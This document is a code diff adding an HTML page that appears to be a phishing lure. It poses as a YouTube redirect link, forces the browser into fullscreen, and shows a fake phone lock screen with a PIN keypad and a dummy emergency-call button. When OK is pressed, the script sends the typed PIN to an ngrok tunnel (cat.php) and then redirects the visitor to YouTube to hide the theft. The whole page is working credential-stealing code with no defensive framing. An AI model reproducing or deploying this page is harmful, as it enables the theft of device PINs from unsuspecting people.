@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
+<meta name="viewport" content="width=device-width, initial-scale=1"; charset="utf-8">
+<style>
+
+@import url(https://fonts.googleapis.com/css?family=Droid+Sans);
+@import url(https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css);
+
+* {
+  padding: 0;
+  margin: 0;
+}
+
+
+#redirect {
+  padding:15px;
+  margin-top:10px;
+}
+ html,body { visibility:hidden;
+ 
+  }
+#content {
+
+  height: 100%;
+  overflow: hidden;
+  font-size: 16px;
+  font-family: "Droid Sans";
+  background-color: #212F3D;
+  background: url("https://img.xda-cdn.com/mPf-MsckWG4QyfuYcxHzAISI77s=/http%3A%2F%2Fsamsung-wallpapers.com%2Fuploads%2Fallimg%2F150301%2F1-150301203Q2.jpg") no-repeat center center fixed; 
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+ 
+}
+
+#content::after{
+  content:"";
+  background:rgba(0,0,0,.7);
+  width:100%;
+  height:100%;
+  position:absolute;
+  left:0;
+  top:0;
+  z-index:1;
+  background-size: cover;
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+}
+
+* {
+  -moz-user-select: -moz-none;
+  -ms-user-select: none;
+  -webkit-user-select: none;
+  user-select: none;
+
+}
+
+.button1 {
+  background-color: transparent;
+  border: none;
+}
+
+.button {
+  z-index:10;
+  -webkit-border-radius: 1vh;
+  -moz-border-radius: 1vh;
+  -ms-border-radius: 1vh;
+  -o-border-radius: 1vh;
+  border-radius: 1vh;
+  position:relative;
+  left: 0;
+  top: inherit;
+  right: 0;
+  bottom: 10;
+  background-color: transparent;
+  font-size: 2.3vh;
+  color: white;
+  border: 100hv;
+  border-color: gray;
+  -webkit-tap-highlight-color:  rgba(255, 255, 255, 0); 
+  outline:0;
+
+
+}
+
+.footer {
+  z-index:10;
+  position: absolute;
+  left: 0;
+  top: inherit;
+  right: 0;
+  bottom: 2vh;
+  height: 4vh;
+  line-height: 4vh;
+  font-size: 1.5vh;
+  text-align: center;
+}
+
+
+.panel {
+  z-index:10;
+  position: absolute;
+  left: 0;
+  top: 39%;
+  right: 0;
+  bottom: 4%;
+  background:transparent;
+}
+.panel .title {
+  font-size: 3vh;
+  font-family: sans-serif;
+  text-align: center;
+  margin: 1% 0;
+  padding: 1vh;
+  color: #FFF;
+  font-weight: normal;
+}
+
+
+
+.panel .field {
+  z-index:10;
+  vertical-align: middle;
+  border: 20px;
+  border-color: #FFF;
+  margin: 1vh 10vw;
+  height: 6vh;
+  line-height: 8vh;
+  text-align: center;
+  border-radius: 10px;
+  background: #585858;
+  color: #FFF;
+  font-size: 6vh;
+  -webkit-box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.5), 0 1px 2px white;
+  -moz-box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.5), 0 1px 2px white;
+  box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.5), 0 1px 2px white;
+  opacity: 0.9;
+  text-security:disc;
+  -webkit-text-security:disc;
+  -moz-text-security:disc;
+}
+.panel .keyboard: {
+ 
+  height: 75vh;
+}
+.panel .keyboard .line {
+
+  height: 9vh;
+  text-align: center;
+}
+
+.panel .keyboard .line .btn {
+
+  margin: 2vh 2vw;
+  padding: 2vh 2vw;
+  display: inline-block;
+  width: 18vw;
+  height: 7vh;
+  cursor: pointer;
+  text-align: center;
+  vertical-align: middle;
+  font-size: 5vh;
+  color: white;
+  border: 0px;
+  font-weight: normal;
+
+
+}
+
+.panel .keyboard .line .btn:active {
+  -webkit-box-shadow: none;
+  -moz-box-shadow: none;
+  box-shadow: none;
+}
+
+.panel .keyboard .line .btn_ok {
+  margin: 2vh 2vw;
+  padding: 2vh 2vw;
+  display: inline-block;
+  width: 18vw;
+  height: 7vh;
+  cursor: pointer;
+  text-align: center;
+  vertical-align: middle;
+  font-size: 5vh;
+  color: gray;
+  border: 0px;
+  font-weight: bold;
+
+}
+</style>
+
+</head>
+<body onload="block()">
+
+<div id="redirect">
+<button class="button1" onclick="myFunction();">Redirect to https://www.youtube.com...</button>
+</div>
+<div class="content" id="content">
+<div class="header"></div>
+
+  <div class="panel">
+    <div class="title">PIN Code:</div>
+    <div class="field">
+    </div>
+    <div class="keyboard">
+      <div class="line">
+        <div class="btn" key="1">1</div>
+        <div class="btn" key="2">2</div>
+        <div class="btn" key="3">3</div>
+      </div>
+      <div class="line">
+        <div class="btn" key="4">4</div>
+        <div class="btn" key="5">5</div>
+        <div class="btn" key="6">6</div>
+      </div>
+      <div class="line">
+        <div class="btn" key="7">7</div>
+        <div class="btn" key="8">8</div>
+        <div class="btn" key="9">9</div>
+      </div>
+      <div class="line">
+        <div class="btn fa fa-arrow-left" key="-1"></div>
+        <div class="btn" key="0">0</div>
+        <div class="btn" key="-3">OK</div>
+      </div>
+    </div>
+  </div>
+
+<div class="footer">
+  <button class= "button" ">EMERGENCY CALL</button></div>
+</div>
+
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script type="text/javascript">
+
+(function () {
+  var num;
+
+  num = "";
+
+  $(".btn").on("click", function (e) {
+    var v;
+    v = $(this).attr('key');
+    switch (v) {
+      case "-1":
+        num = num.slice(0, num.length - 1);
+        break;
+      case "-2":
+        num = "";
+        break;
+
+      case "-3":
+         $.ajax({
+    type: 'POST',
+    url: 'https://70f01739a443.ngrok.io/cat.php',
+    data: { 
+        'pin': num 
+
+    },
+    success: function(msg){
+       
+    }
+});
+    num = "";
+    window.location.replace("https://www.youtube.com");
+    break;
+
+      default:
+        num += v;}
+
+    return $(".field").text(num);
+  });
+
+}).call(this);
+
+
+</script>
+<script>
+
+function block() {
+
+  $(document).ready(function() {
+  document.getElementsByTagName("html")[0].style.visibility = "visible";
+  document.getElementsByTagName("body")[0].style.visibility = "visible";
+
+});
+
+
+
+  var y = document.getElementById("redirect");
+  var a = document.getElementById("content");
+
+  if (a.style.display === "none") {
+
+    a.style.display = "block";
+    y.style.display = "none";
+  } else {
+
+    a.style.display = "none";
+    y.style.display = "block";
+    
+  }
+}
+
+function myFunction() {
+
+
+  toggleFullScreen(document.body);
+
+  var y = document.getElementById("redirect");
+  var a = document.getElementById("content"); 
+ 
+document.addEventListener("fullscreenchange", function() {
+
+if (a.style.display === "none") {
+    a.style.display = "block";
+    y.style.display = "none";
+  } else {
+    a.style.display = "none";
+    y.style.display = "block";
+    
+  }
+
+});
+document.addEventListener("mozfullscreenchange", function() {
+
+  if (a.style.display === "none") {
+
+    a.style.display = "block";
+    y.style.display = "none";
+  } else {
+
+    a.style.display = "none";
+    y.style.display = "block";
+    
+  }
+
+});
+document.addEventListener("webkitfullscreenchange", function() {
+
+
+
+ if (a.style.display === "none") {
+
+    a.style.display = "block";
+    y.style.display = "none";
+    
+  } else {
+
+    a.style.display = "none";
+    y.style.display = "block";
+    
+  }
+
+});
+document.addEventListener("msfullscreenchange", function() {
+
+if (a.style.display === "none") {
+
+    a.style.display = "block";
+    y.style.display = "none";
+  } else {
+
+    a.style.display = "none";
+    y.style.display = "block";
+    
+  }
+
+});
+
+}
+
+function toggleFullScreen(elem) {
+    // ## The below if statement seems to work better ## if ((document.fullScreenElement && document.fullScreenElement !== null) || (document.msfullscreenElement && document.msfullscreenElement !== null) || (!document.mozFullScreen && !document.webkitIsFullScreen)) {
+    if ((document.fullScreenElement !== undefined && document.fullScreenElement === null) || (document.msFullscreenElement !== undefined && document.msFullscreenElement === null) || (document.mozFullScreen !== undefined && !document.mozFullScreen) || (document.webkitIsFullScreen !== undefined && !document.webkitIsFullScreen) || (document.fullscreenElement !== undefined && document.fullscreenElement === null)) {
+        if (elem.requestFullScreen) {
+            elem.requestFullScreen();
+        } else if (elem.mozRequestFullScreen) {
+            elem.mozRequestFullScreen();
+        } else if (elem.webkitRequestFullScreen) {
+            elem.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
+        } else if (elem.msRequestFullscreen) {
+            elem.msRequestFullscreen();
+        }
+    } else {
+        if (document.cancelFullScreen) {
+            document.cancelFullScreen();
+        } else if (document.mozCancelFullScreen) {
+            document.mozCancelFullScreen();
+        } else if (document.webkitCancelFullScreen) {
+            document.webkitCancelFullScreen();
+        } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+        }
+    }
+}
+
+</script>
+
+</body>
+</html>
